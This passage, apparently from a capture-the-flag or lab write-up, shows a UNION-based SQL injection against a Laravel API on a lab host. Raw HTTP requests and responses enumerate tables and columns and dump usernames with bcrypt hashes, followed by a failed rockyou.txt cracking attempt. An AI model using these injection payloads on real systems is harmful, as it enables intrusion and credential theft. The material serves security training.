## Dumping Hashes via SQL Injection

In the `uhc` database, there are five tables:

1. `migrations`
2. `password_resets`
3. `personal_access_token`
4. `tasks`
5. `users`

```http
GET /api/getprofile HTTP/1.1
Host: 10.129.227.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://10.129.227.109/
Cookie: laravel_session=eyJpdiI6InFld3pGNjFlY2hvQk1yeFIvczVPVWc9PSIsInZhbHVlIjoiQkdwY0J5blNUbXZaeUJEa0NTSGtOTWIwZXdLUXViRk5GSzBZR003N0xmWUtVV2xKcUVaUGdReTk2dVRGZ1lqZ0NIZkpqRUJSWVAvQmw0ZmwyV1VnKy81REIwZ0VPMmtEVDBNQzdMbTBrZnlPck8yR1h6b3dPeHBETGZZR0NteHEiLCJtYWMiOiIyOWJhOTlmMzYzYTRjYzY3OGYwMjkwNjY2MGU0NTg1YTU0MWMyMzRjMTI1ODZkMzE0NTY5ZDE5YWNiNjdiZjJlIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6ImZKY1ZWc0lIeVBXQ0VTVzJhQXhQOWc9PSIsInZhbHVlIjoiWE9YeEh3RjZZVFpSMndLQ0krb1B1bk1rZnl4Q0dFZmFVRkd0VTgxanB5QkhvZUtWMmUxb0hINVorMWRMeTZYUzhqM25Ld0NwSk9Pbld4ME5XMUpjWHd2ZEtFUSswYWxhK1RVZXlzY2VJOUl4YlVNRm1CUWZmbHBUSUdaVXp2Z2giLCJtYWMiOiJmYjhjMWVmY2Y1MjQzZTQ3OTJiNjAwMTRlMDA2YzMyODM3NmMwMzNjMmFmNTc0ZWFlZjg3YTFkYzFhYWNhZjMyIiwidGFnIjoiIn0%3D
Content-Type: application/json
Content-Length: 130

{"id": "10 UNION SELECT 'a','b',TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = 'uhc' LIMIT 5,1--", "secret":true }
```

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache, private
Date: Wed, 07 Sep 2022 18:53:42 GMT
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 54
Access-Control-Allow-Origin: *
Set-Cookie: laravel_session=eyJpdiI6ImhYczB2aExwK3NRSkZJendmUXFzZnc9PSIsInZhbHVlIjoiR05GUVRieHpPS2JEQXpnci9MSjNsOU5pWnhEa1lpeks3SENjNWN5VDRlb1pHL0V1L2FYL1B3WGNGa255d2RzM29uNDAydzdnbnhoTjczZ1lOMTlUc2FhVzJyTTFyOE1nM0ovYXhkeHg4UjJ1VEV6MzNISlFXZTdVN3ZZOGJnc3UiLCJtYWMiOiI4NTU4Yzk0Zjk3OTlhMWQ5YzJlMTAzZTgyZWI5ZTM0YjI3NGFhYjIzMzExZTY1YmNmMTAzMDI4YWQ1MmVmN2Q5IiwidGFnIjoiIn0%3D; expires=Wed, 07-Sep-2022 20:53:42 GMT; Max-Age=7200; path=/; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 5

users
```

There are 9 ows in the `users` table.

```http
GET /api/getprofile HTTP/1.1
Host: 10.129.227.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://10.129.227.109/
Cookie: laravel_session=eyJpdiI6InFld3pGNjFlY2hvQk1yeFIvczVPVWc9PSIsInZhbHVlIjoiQkdwY0J5blNUbXZaeUJEa0NTSGtOTWIwZXdLUXViRk5GSzBZR003N0xmWUtVV2xKcUVaUGdReTk2dVRGZ1lqZ0NIZkpqRUJSWVAvQmw0ZmwyV1VnKy81REIwZ0VPMmtEVDBNQzdMbTBrZnlPck8yR1h6b3dPeHBETGZZR0NteHEiLCJtYWMiOiIyOWJhOTlmMzYzYTRjYzY3OGYwMjkwNjY2MGU0NTg1YTU0MWMyMzRjMTI1ODZkMzE0NTY5ZDE5YWNiNjdiZjJlIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6ImZKY1ZWc0lIeVBXQ0VTVzJhQXhQOWc9PSIsInZhbHVlIjoiWE9YeEh3RjZZVFpSMndLQ0krb1B1bk1rZnl4Q0dFZmFVRkd0VTgxanB5QkhvZUtWMmUxb0hINVorMWRMeTZYUzhqM25Ld0NwSk9Pbld4ME5XMUpjWHd2ZEtFUSswYWxhK1RVZXlzY2VJOUl4YlVNRm1CUWZmbHBUSUdaVXp2Z2giLCJtYWMiOiJmYjhjMWVmY2Y1MjQzZTQ3OTJiNjAwMTRlMDA2YzMyODM3NmMwMzNjMmFmNTc0ZWFlZjg3YTFkYzFhYWNhZjMyIiwidGFnIjoiIn0%3D
Content-Type: application/json
Content-Length: 71

{"id": "10 UNION SELECT 'a','b',COUNT(*) FROM users--", "secret":true }
```

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache, private
Date: Wed, 07 Sep 2022 19:06:15 GMT
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 58
Access-Control-Allow-Origin: *
Set-Cookie: laravel_session=eyJpdiI6IlB1ZnZsNDltRUh2alZkLzlnQ2d3a2c9PSIsInZhbHVlIjoiYzkwVEN0aE9NWVlTTDVPVGQrbHRHSUlCcDNGaGs4VzJNeS8rREM4RWVOeVFIYlBENHliZ1pmeTFVeHNscCthaHZJZlFpcmR1cWZUVWRKZW5hZFN2Rmt4MjZLRWFQN3FuN1V6SnJEY0NRS2dMN2dkajFRd1NXVVhNalJpcnEycFEiLCJtYWMiOiJlZWU2MWE1MmQ2MWFhZmNlMjMyMDhkZjU2Mjc3YzdhY2VkOTgwNDE0ZmJjNGUyNWU4YjYyN2I1ZTdlYjgwOWY3IiwidGFnIjoiIn0%3D; expires=Wed, 07-Sep-2022 21:06:15 GMT; Max-Age=7200; path=/; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 1

9
```

The `users` table has the following columns.

- `CURRENT_CONNECTIONS`: `bigint`
- `TOTAL_CONNECTIONS`: `bigint`
- `USER`: `char`
- `bio`: `longtext`
- `country`: `varchar`
- `created_at`: `timestamp`
- `email`: `varchar`
- `email_verified_at`: `timestamp`
- `id`: `bigint`
- `name`: `varchar`
- `password`: `varchar`
- `remember_token`: `varchar`
- `updated_at`: `timestamp`

```http
GET /api/getprofile HTTP/1.1
Host: 10.129.227.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://10.129.227.109/
Cookie: laravel_session=eyJpdiI6InFld3pGNjFlY2hvQk1yeFIvczVPVWc9PSIsInZhbHVlIjoiQkdwY0J5blNUbXZaeUJEa0NTSGtOTWIwZXdLUXViRk5GSzBZR003N0xmWUtVV2xKcUVaUGdReTk2dVRGZ1lqZ0NIZkpqRUJSWVAvQmw0ZmwyV1VnKy81REIwZ0VPMmtEVDBNQzdMbTBrZnlPck8yR1h6b3dPeHBETGZZR0NteHEiLCJtYWMiOiIyOWJhOTlmMzYzYTRjYzY3OGYwMjkwNjY2MGU0NTg1YTU0MWMyMzRjMTI1ODZkMzE0NTY5ZDE5YWNiNjdiZjJlIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6ImZKY1ZWc0lIeVBXQ0VTVzJhQXhQOWc9PSIsInZhbHVlIjoiWE9YeEh3RjZZVFpSMndLQ0krb1B1bk1rZnl4Q0dFZmFVRkd0VTgxanB5QkhvZUtWMmUxb0hINVorMWRMeTZYUzhqM25Ld0NwSk9Pbld4ME5XMUpjWHd2ZEtFUSswYWxhK1RVZXlzY2VJOUl4YlVNRm1CUWZmbHBUSUdaVXp2Z2giLCJtYWMiOiJmYjhjMWVmY2Y1MjQzZTQ3OTJiNjAwMTRlMDA2YzMyODM3NmMwMzNjMmFmNTc0ZWFlZjg3YTFkYzFhYWNhZjMyIiwidGFnIjoiIn0%3D
Content-Type: application/json
Content-Length: 157

{"id": "10 UNION SELECT 'a','b',CONCAT(COLUMN_NAME, ':', DATA_TYPE) FROM information_schema.columns WHERE TABLE_NAME = 'users' LIMIT 0,1--", "secret":true }
```

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache, private
Date: Wed, 07 Sep 2022 19:01:07 GMT
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 59
Access-Control-Allow-Origin: *
Set-Cookie: laravel_session=eyJpdiI6IndlN051M1lrUFZTWGJEZGFGQVQxc2c9PSIsInZhbHVlIjoieEhFYUFUNWtkOEs4eExsWlEwR1Vha1pFOTgzZ2Jpbkw4NTdCRmhsWnJWVjVUSWlzQmpnRTNoUE04VkhEbXptYlY2c1c2eno0QUt5YzZjRVlyWEFzY21lN0RCaEgvL21yaVppbGpaaUczMkM2b2U0ZVVQbUZ3WmJDR0ZScXZXSHkiLCJtYWMiOiIyYWY1Njc4NjZhMWNjZTkyNGVmNTdmODI1MWYwYzBmNTJkNzAwYzg5MDRhOTEyZGZkZjMwY2FkZTAzY2IxOTFiIiwidGFnIjoiIn0%3D; expires=Wed, 07-Sep-2022 21:01:07 GMT; Max-Age=7200; path=/; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 26

CURRENT_CONNECTIONS:bigint
```

Dump the credentials.

```http
GET /api/getprofile HTTP/1.1
Host: 10.129.227.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://10.129.227.109/
Cookie: laravel_session=eyJpdiI6InFld3pGNjFlY2hvQk1yeFIvczVPVWc9PSIsInZhbHVlIjoiQkdwY0J5blNUbXZaeUJEa0NTSGtOTWIwZXdLUXViRk5GSzBZR003N0xmWUtVV2xKcUVaUGdReTk2dVRGZ1lqZ0NIZkpqRUJSWVAvQmw0ZmwyV1VnKy81REIwZ0VPMmtEVDBNQzdMbTBrZnlPck8yR1h6b3dPeHBETGZZR0NteHEiLCJtYWMiOiIyOWJhOTlmMzYzYTRjYzY3OGYwMjkwNjY2MGU0NTg1YTU0MWMyMzRjMTI1ODZkMzE0NTY5ZDE5YWNiNjdiZjJlIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6ImZKY1ZWc0lIeVBXQ0VTVzJhQXhQOWc9PSIsInZhbHVlIjoiWE9YeEh3RjZZVFpSMndLQ0krb1B1bk1rZnl4Q0dFZmFVRkd0VTgxanB5QkhvZUtWMmUxb0hINVorMWRMeTZYUzhqM25Ld0NwSk9Pbld4ME5XMUpjWHd2ZEtFUSswYWxhK1RVZXlzY2VJOUl4YlVNRm1CUWZmbHBUSUdaVXp2Z2giLCJtYWMiOiJmYjhjMWVmY2Y1MjQzZTQ3OTJiNjAwMTRlMDA2YzMyODM3NmMwMzNjMmFmNTc0ZWFlZjg3YTFkYzFhYWNhZjMyIiwidGFnIjoiIn0%3D
Content-Type: application/json
Content-Length: 100

{"id": "10 UNION SELECT 'a','b',CONCAT(name, ':', password) FROM users LIMIT 0,1--", "secret":true }
```

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache, private
Date: Wed, 07 Sep 2022 19:05:30 GMT
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 59
Access-Control-Allow-Origin: *
Set-Cookie: laravel_session=eyJpdiI6InZWc3RMNm9tU1RKeHNsWVFBWkwrTlE9PSIsInZhbHVlIjoiNWpTenRBbXVwdG5ORUhlSERZaEd0cHZlaFI4cDdVNE5Oc0JtNHgzYlFxdU9CWW1Ga1hncVBVRDV2V1NBbVhVQjlnMy9KVnRyQi9iYmhNSmxiR1pRSmVxSXhWaHA1Z21kQ2tTUzBlWFVnakZ6VmhRc0tvNjFDMG53VEpQSzZNZzciLCJtYWMiOiIwM2E1YTIxMjU3NmNiZTM2Y2IzZTcwMWIwZDc0NjY4MmVlNTY1OGUxNDJhYWVhZGFlMTgzYmFjMGNmZjM1YzU0IiwidGFnIjoiIn0%3D; expires=Wed, 07-Sep-2022 21:05:30 GMT; Max-Age=7200; path=/; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 67

big0us:$2y$10$L3X8m6P1w.F2aO011ffWr.587vGCYeFXuXwE2vr3DbrYkcuF741N2
```

```txt
big0us:$2y$10$L3X8m6P1w.F2aO011ffWr.587vGCYeFXuXwE2vr3DbrYkcuF741N2
celesian:$2y$10$8ewqN3lE9iazbo8sFiwUleeNIbOpAMRcaMzeiXJ50wlItN2Kd5pI6
luska:$2y$10$KdZCbzxXRsBOBHI.91XIz.O.lQQ3TqeY8uonzAumoAv6v9JVQv3g.
tinyb0y:$2y$10$X501zxcWLKXf.OteOaPILuhMBIalFjid5bBjBkrst/cynKL/DLfiS
o-tafe:$2y$10$XIrsc.ma/p0qhvWm9.sqyOnA5184ICWNverXQVLQJD30nCw7.PyxW
watchdog:$2y$10$RTbD7i5I53rofpAfr83YcOK2XsTglO01jVHZajEOSH1tGXiU8nzEq
mydonut:$2y$10$7DFlqs/eXGm0JPVebpPheuEx3gXPhTnRmN1Ia5wutECZg1El7cVJK
bee:$2y$10$Furn1Q0Oy8IbeCslv7.Oy.psgPoCH2ds3FZfJeQlCdxJ0WVhLKmzm
admin:$2y$10$BQejhFXN0w60DWVSZSuaserehCaoF32tUbFsH.dOXaQTdtqngZ2BO
```

Unfortunately, none of these hashes are cracked with `rockyou.txt`.

